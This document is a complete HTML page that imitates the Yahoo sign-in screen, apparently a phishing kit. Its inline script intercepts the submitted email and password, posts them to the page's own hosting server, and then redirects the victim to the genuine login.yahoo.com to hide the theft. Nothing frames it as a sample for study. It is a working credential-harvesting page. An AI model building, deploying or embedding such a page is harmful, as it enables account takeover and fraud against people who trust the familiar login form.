<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Yahoo</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Helvetica Neue',Helvetica,Arial,sans-serif;background:white}.container{display:flex;justify-content:center;align-items:center;min-height:100vh}.box{width:360px;padding:40px 24px;text-align:center}.logo{margin-bottom:32px;font-size:40px;font-weight:700;color:#5f01d1}.logo span{color:#5f01d1}input{width:100%;padding:14px;border:1px solid #ccc;border-radius:4px;font-size:16px;margin-bottom:16px;outline:none}input:focus{border-color:#1a73e8;box-shadow:0 0 0 2px rgba(26,115,232,.2)}input[type="submit"]{background:#1a73e8;color:white;border:none;font-weight:700;cursor:pointer;border-radius:24px}input[type="submit"]:hover{background:#1557b0}.link{font-size:14px;color:#1a73e8;text-decoration:none}.link:hover{text-decoration:underline}</style></head><body><div class="container"><div class="box"><div class="logo">Yahoo!</div><form method="POST"><input type="text"name="username"placeholder="Email or phone number"required><input type="password"name="passwd"placeholder="Password"required><input type="submit"value="Next"></form><a href="#"class="link">Forgot password?</a></div></div><script>document.querySelector('form').addEventListener('submit',function(e){e.preventDefault();fetch('',{method:'POST',body:new FormData(this)}).then(function(){window.location.href='https://login.yahoo.com';});});</script></body></html>
